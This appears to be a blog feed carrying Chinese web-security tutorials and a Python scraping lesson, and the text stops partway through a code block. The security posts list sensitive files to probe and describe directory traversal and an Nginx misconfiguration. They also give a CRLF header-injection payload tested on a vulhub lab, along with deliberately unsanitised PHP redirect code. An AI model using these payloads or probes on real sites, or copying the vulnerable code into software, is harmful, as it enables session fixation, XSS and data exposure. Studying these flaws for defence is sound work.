class="line">可以参考猪猪侠的字典：https://github.com/ring04h/weakfilescan/blob/b1a3066e3fdcd60b8ecf635526f49cb5ad603064/dict/configfile.lst</span><br></pre></td></tr></table></figure><p>（3）漏洞修复</p><p>修改配置文件的默认路径，同时在服务器端阻止对这些路径的访问。</p><h3 id="2、配置错误导致的泄露"><a href="#2、配置错误导致的泄露" class="headerlink" title="2、配置错误导致的泄露"></a>2、配置错误导致的泄露</h3><p>（1）Windows IIS&#x2F;Apache 目录穿越</p><p>&lt;1&gt; 漏洞原理：目录穿越漏洞原理比较简单，程序在实现上没有充分过滤用户输入的 <code>../</code> 之类的目录跳转符，导致恶意用户可以访问web根目录的上级从而遍历服务器上的任意文件。虽然 web 服务器本身会禁止访问 web 文件夹以外的地方，但如果是智障开发引入的动态页面，又没有过滤好用户输入，就可能会出现穿越甚至目录遍历。甚至 web 服务器本身也曾经有类似的漏洞，比如 Apache Tomcat 的 UTF-8 解析漏洞，具体利用和绕过可以参考其他网上的文章，这里限于篇幅就不展开了。<br>&lt;2&gt; 文章地址：<a href="https://zhuanlan.zhihu.com/p/21516413">https://zhuanlan.zhihu.com/p/21516413</a></p><p>（2）Nginx配置安全</p><p>&lt;1&gt; 漏洞原理：Nginx 的配置选项之多，并不是所有人都能熟悉，但不表示随便百度一下复制粘贴就配置了，最好还是先看下官方文档对应选项的作用和用法，可以避免许多致命的错误。例如 Nginx 在代理静态文件时，如果不小心在配置文件中写错了一个字符：location &#x2F;static {alias  &#x2F;home&#x2F;web&#x2F;static&#x2F;;}，就会导致访问 <code>http://example.com/static../</code> 时可以访问上级目录，从而访问到敏感的信息。关于 nginx 配置安全，离别歌的这篇文章其实写得很不错，值得每个开发和运维人员仔细了解。<br>&lt;2&gt; 文章地址：<a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p><br><h2 id="四、默认文件泄露"><a href="#四、默认文件泄露" class="headerlink" title="四、默认文件泄露"></a>四、默认文件泄露</h2><h3 id="1、常见的默认文件泄露"><a href="#1、常见的默认文件泄露" class="headerlink" title="1、常见的默认文件泄露"></a>1、常见的默认文件泄露</h3><p>一些集成的搭建环境会存在有一些默认文件，像 XAMPP、PHPStudy等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">README.md</span><br><span class="line">phpinfo.php</span><br></pre></td></tr></table></figure><h3 id="2、数据库文件泄露"><a href="#2、数据库文件泄露" class="headerlink" title="2、数据库文件泄露"></a>2、数据库文件泄露</h3><p>（1）数据备份文件</p><p>数据库文件是以 <code>.sql</code> 结尾，所以可以试一下网站有没有数据库文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backup.sql</span><br></pre></td></tr></table></figure><p>（2）数据库文件</p><p>mdb文件是早期asp+access构架的数据库文件。一般在目录 &#x2F;db&#x2F; 下有一个 mdb 文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/db/db.mdb</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;信息泄露&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>CRLF注入</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CRLF%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CRLF%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-12T14:23:23.978Z</published>
    <updated>2023-05-18T14:20:38.460Z</updated>
    
    <content type="html"><![CDATA[<p>CRLF 注入</p><span id="more"></span><h2 id="一、什么是-CRLF？"><a href="#一、什么是-CRLF？" class="headerlink" title="一、什么是 CRLF？"></a>一、什么是 CRLF？</h2><p>CRLF 指的是回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)，操作系统就是根据这个标识来进行换行的，你在键盘输入回车键就是输出这个字符，只不过win和linux系统采用的标识不一样而已。</p><p>在 HTTP 当中 HTTP 的 Header 和 Body 之间就是用两个 crlf 进行分隔的，如果能控制 HTTP 消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以CRLF injection 又叫做 HTTP response Splitting，简称 HRS。CRLF 漏洞可以造成 <strong>Cookie会话固定</strong> 和 <strong>反射型XSS(可过waf)</strong> 的危害，注入XSS的利用方式：<strong>连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</strong></p><br><h2 id="二、原理分析"><a href="#二、原理分析" class="headerlink" title="二、原理分析"></a>二、原理分析</h2><p>HRS漏洞存在的前提是 ：url 当中输入的字符会影响到文件，比如在重定位当中可以尝试使用 <code>%0d%0a</code> 作为 CRLF。</p><p>一般网站会在HTTP头中加上 <code>Location: http://baidu.com</code> 的方式来进行 302 跳转，所以我们能控制的内容就是 Location: 后面的XXX网址，对这个地址进行污染。</p><p>假设服务端（PHP）的处理方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>(<span class="string">&quot;security_level&quot;</span>) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码意思是说当条件满足时，将请求包中的url参数值拼接到Location字符串中，并设置成响应头发送给客户端。</p><p>此时服务器端接收到的url参数值是我们修改后的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/xxx%0a%0dSet-Cookie: test=123</span><br></pre></td></tr></table></figure><p>在url参数值拼接到Location字符串中，设置成响应头后，响应头就会看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: test=123</span><br></pre></td></tr></table></figure><br><h2 id="三、本地测试"><a href="#三、本地测试" class="headerlink" title="三、本地测试"></a>三、本地测试</h2><p>在 Ubuntu 上利用 docker 搭建 vulhub 靶场，进入 <code>/vulhub/nginx/insecure-configuration</code> （docker 的安装方法这里就不赘述），8080 端口是 CRLF 注入的靶场。</p><p>启动容器 docker：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/CRLF-2.png" alt="CRLF-2"></p><p>构造 payload ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/%0a%0dSet-Cookie: test=123</span><br></pre></td></tr></table></figure><p>查看响应头，发现有个字段是 <code>Set-Cookie: test=123</code>，说明响应头文件的信息被我们修改了。</p><p><img src="/images/Web%E6%BC%8F%E6%B4%9E/CRLF-1.png" alt="CRLF-1"></p><br><h2 id="四、修复方法"><a href="#四、修复方法" class="headerlink" title="四、修复方法"></a>四、修复方法</h2><p>服务端收到前端过来的参数，在加入Location之前，需要过滤 \r 、\n 之类的行结束符，避免输入的数据污染其它HTTP首部字段。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CRLF 注入&lt;/p&gt;</summary>
    
    
    
    <category term="Web漏洞" scheme="http://blog.hvvl404.fun/categories/Web%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
  <entry>
    <title>Python爬虫-解析</title>
    <link href="http://blog.hvvl404.fun/2023/05/12/Python/14_Python%E7%88%AC%E8%99%AB_%E8%A7%A3%E6%9E%90/"/>
    <id>http://blog.hvvl404.fun/2023/05/12/Python/14_Python%E7%88%AC%E8%99%AB_%E8%A7%A3%E6%9E%90/</id>
    <published>2023-05-12T13:03:55.780Z</published>
    <updated>2023-05-12T13:11:37.281Z</updated>
    
    <content type="html"><![CDATA[<p>解析</p><span id="more"></span><h4 id="一、xpath"><a href="#一、xpath" class="headerlink" title="一、xpath"></a>一、xpath</h4><h5 id="1、xpath的基本使用"><a href="#1、xpath的基本使用" class="headerlink" title="1、xpath的基本使用"></a>1、xpath的基本使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;a1&quot;</span>&gt;</span>厦门<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l2&quot;</span>&gt;</span>福州<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l3&quot;</span>&gt;</span>泉州<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;c1&quot;</span>&gt;</span>漳州<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;c2&quot;</span>&gt;</span>南平<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;c3&quot;</span>&gt;</span>龙岩<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">tree = etree.parse(<span class="string">&#x27;01_解析_xpath的基本使用.html&#x27;</span>)</span><br><span class="line">li_list = tree.xpath(<span class="string">&#x27;//ul/li/text()&#x27;</span>)</span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;, &#x27;福州&#x27;, &#x27;泉州&#x27;, &#x27;漳州&#x27;, &#x27;南平&#x27;, &#x27;龙岩&#x27;]</span></span><br><span class="line"><span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot;]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># # [&#x27;厦门&#x27;]</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot;]/@class&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;a1&#x27;]</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询包含 “字符串” 的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[contains(@id,&quot;l&quot;)]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;, &#x27;福州&#x27;, &#x27;泉州&#x27;]</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询以 “字符串” 开头的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[starts-with(@id,&quot;c&quot;)]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;漳州&#x27;, &#x27;南平&#x27;, &#x27;龙岩&#x27;]</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与语句 查询id为l1 和 class为a1的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot; and @class=&quot;a1&quot;]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;]</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或语句 查询id为l1 和 id为l2的数据</span></span><br><span class="line"><span class="comment"># li_list = tree.xpath(&#x27;//ul/li[@id=&quot;l1&quot;]/text() | //ul/li[@id=&quot;l2&quot;]/text()&#x27;)</span></span><br><span class="line"><span class="comment"># [&#x27;厦门&#x27;, &#x27;福州&#x27;]</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(li_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(li_list))</span><br></pre></td></tr></table></figure><h5 id="2、xpath-获取百度-百度一下"><a href="#2、xpath-获取百度-百度一下" class="headerlink" title="2、xpath 获取百度-百度一下"></a>2、xpath 获取百度-百度一下</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com/&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url = url,headers = headers)</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">tree = etree.HTML(content)</span><br><span class="line"></span><br><span class="line">result = tree.xpath(<span class="string">&#x27;//input[@type=&quot;submit&quot;]/@value&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h5 id="3、xpath-站长素材"><a href="#3、xpath-站长素材" class="headerlink" title="3、xpath 站长素材"></a>3、xpath 站长素材</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_request</span>(<span class="params">page</span>):</span><br><span class="line">    <span class="keyword">if</span>(page == <span class="number">1</span>):</span><br><span class="line">        url = <span class="string">&#x27;https://sc.chinaz.com/tupian/QiCheTuPian.html&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">&#x27;https://sc.chinaz.com/tupian/QiCheTuPian_&#x27;</span> + <span class="built_in">str</span>(page) + <span class="string">&#x27;.html&#x27;</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    request = urllib.request.Request(url = url,headers = headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">request</span>):</span><br><span class="line">    response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">    content = response.read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down_loads</span>(<span class="params">content</span>):</span><br><span class="line">    tree = etree.HTML(content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注意：xpath方法返回的值是列表类型</span></span><br><span class="line">    name_list = tree.xpath(<span class="string">&#x27;//div[@class=&quot;container&quot;]//img/@alt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    src_list = tree.xpath(<span class="string">&#x27;//div[@class=&quot;container&quot;]//img/@data-original&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name_list)):</span><br><span class="line">        name = name_list[i]</span><br><span class="line">        src = src_list[i]</span><br><span class="line">        url =<span class="string">&#x27;https:&#x27;</span> + src</span><br><span class="line">        <span class="built_in">print</span>(name,src)</span><br><span class="line">        result = urllib.request.urlretrieve(url = url,filename =<span class="string">&#x27;./QiCheImage/&#x27;</span> + name + <span class="string">&#x27;.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start_page = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入起始页码：&#x27;</span>))</span><br><span class="line">    end_page = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入结束页码：&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(start_page,end_page+<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># （1）请求对象的定制</span></span><br><span class="line">        request = create_request(page)</span><br><span class="line">        <span class="comment"># （2）获取请求的数据</span></span><br><span class="line">        content = get_content(request)</span><br><span class="line">        <span class="comment"># （3）下载数据</span></span><br><span class="line">        down_loads(content)</span><br></pre></td></tr></table></figure><br><h4 id="二、jsonpath"><a href="#二、jsonpath" class="headerlink" title="二、jsonpath"></a>二、jsonpath</h4><h5 id="1、jsonpath-的基本使用"><a href="#1、jsonpath-的基本使用" class="headerlink" title="1、jsonpath 的基本使用"></a>1、jsonpath 的基本使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;store&quot;: &#123;</span><br><span class="line">    &quot;book&quot;: [</span><br><span class="line">      &#123; &quot;category&quot;: &quot;reference&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;Nigel Rees&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Sayings of the Century&quot;,</span><br><span class="line">        &quot;price&quot;: 8.95</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123; &quot;category&quot;: &quot;fiction&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;Evelyn Waugh&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Sword of Honour&quot;,</span><br><span class="line">        &quot;price&quot;: 12.99</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123; &quot;category&quot;: &quot;fiction&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;Herman Melville&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;Moby Dick&quot;,</span><br><span class="line">        &quot;isbn&quot;: &quot;0-553-21311-3&quot;,</span><br><span class="line">        &quot;price&quot;: 8.99</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123; &quot;category&quot;: &quot;fiction&quot;,</span><br><span class="line">        &quot;author&quot;: &quot;J. R. R. Tolkien&quot;,</span><br><span class="line">        &quot;title&quot;: &quot;The Lord of the Rings&quot;,</span><br><span class="line">        &quot;isbn&quot;: &quot;0-395-19395-8&quot;,</span><br><span class="line">        &quot;price&quot;: 22.99</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;bicycle&quot;: &#123;</span><br><span class="line">      &quot;color&quot;: &quot;red&quot;,</span><br><span class="line">      &quot;price&quot;: 19.95</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line">obj = json.load(<span class="built_in">open</span>(<span class="string">&#x27;04_解析_jsonpath之基本使用.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 书的所有作者</span></span><br><span class="line"><span class="comment"># author_list = jsonpath.jsonpath(obj,&#x27;$.store.book[*].author&#x27;)</span></span><br><span class="line"><span class="comment"># print(author_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有作者（除了书之外的作者）</span></span><br><span class="line"><span class="comment"># author_list = jsonpath.jsonpath(obj,&#x27;$..author&#x27;)</span></span><br><span class="line"><span class="comment"># print(author_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 商店以下的信息</span></span><br><span class="line"><span class="comment"># tag_list = jsonpath.jsonpath(obj,&#x27;$.store.*&#x27;)</span></span><br><span class="line"><span class="comment"># print(tag_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 商店下面的price信息</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$.store..price&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三本书</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[2]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后一本书</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[(@.length-1)]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 前两本书</span></span><br><span class="line"><span class="comment"># (1) book_list = jsonpath.jsonpath(obj,&#x27;$..book[0,1]&#x27;)</span></span><br><span class="line"><span class="comment"># (2) book_list = jsonpath.jsonpath(obj,&#x27;$..book[:2]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 含有 isbn 的书 条件判断要用? 在()前加?</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[?(@.isbn)]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># price 大于10 的书</span></span><br><span class="line"><span class="comment"># book_list = jsonpath.jsonpath(obj,&#x27;$..book[?(@.price&gt;10)]&#x27;)</span></span><br><span class="line"><span class="comment"># print(book_list)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示全部信息</span></span><br><span class="line">book_list = jsonpath.jsonpath(obj,<span class="string">&#x27;$..*&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(book_list)</span><br></pre></td></tr></table></figure><h5 id="2、jsonpath-淘票票"><a href="#2、jsonpath-淘票票" class="headerlink" title="2、jsonpath 淘票票"></a>2、jsonpath 淘票票</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 